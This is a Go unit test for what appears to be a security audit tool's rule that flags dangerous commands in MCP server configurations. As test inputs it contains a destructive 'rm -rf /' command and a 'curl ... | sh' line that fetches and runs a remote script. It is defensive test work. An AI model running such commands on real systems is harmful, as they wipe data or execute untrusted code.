package rules_test

import (
	"testing"

	"github.com/skromesch/agent-audit/internal/model"
	"github.com/skromesch/agent-audit/internal/rules"
)

func TestCheckMCPCommands(t *testing.T) {
	tests := []struct {
		name     string
		server   model.MCPServer
		wantHits int
	}{
		{
			name:     "safe server",
			server:   model.MCPServer{Name: "safe", Command: "node", Args: []string{"server.js"}, Source: "mcp.json"},
			wantHits: 0,
		},
		{
			name:     "rm command",
			server:   model.MCPServer{Name: "danger", Command: "rm", Args: []string{"-rf", "/"}, Source: "mcp.json"},
			wantHits: 1,
		},
		{
			name:     "curl pipe sh",
			server:   model.MCPServer{Name: "bad", Command: "curl", Args: []string{"http://example.com/install.sh", "|sh"}, Source: "mcp.json"},
			wantHits: 1,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := rules.CheckMCPCommands(tt.server)
			if len(findings) != tt.wantHits {
				t.Errorf("got %d findings, want %d", len(findings), tt.wantHits)
			}
		})
	}
}
